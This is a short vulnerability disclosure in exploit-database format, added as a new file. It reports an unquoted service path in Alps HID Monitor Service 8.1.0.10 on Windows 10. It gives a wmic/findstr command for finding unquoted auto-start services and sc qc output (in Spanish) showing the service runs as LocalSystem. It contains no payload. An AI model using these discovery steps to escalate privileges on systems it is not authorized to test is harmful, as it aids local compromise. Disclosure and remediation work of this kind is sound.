@@ -1,0 +1,29 @@
+# Exploit Title: Alps HID Monitor Service 8.1.0.10 - 'ApHidMonitorService' Unquote Service Path
+# Date: 2019-11-07
+# Exploit Author: Héctor Gabriel Chimecatl Hernández
+# Vendor Homepage: https://www.alps.com/e/
+# Software Link: https://www.alps.com/e/
+# Version: 8.1.0.10
+# Tested on: Windows 10 Home Single Language x64 Esp
+
+# Step to discover the unquoted Service:
+
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# Service info:
+
+Alps HID Monitor Service	ApHidMonitorService	C:\Program Files\Apoint2K\HidMonitorSvc.exe	Auto
+
+C:\Users\user>sc qc ApHidMonitorService
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: ApHidMonitorService
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\Apoint2K\HidMonitorSvc.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Alps HID Monitor Service
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
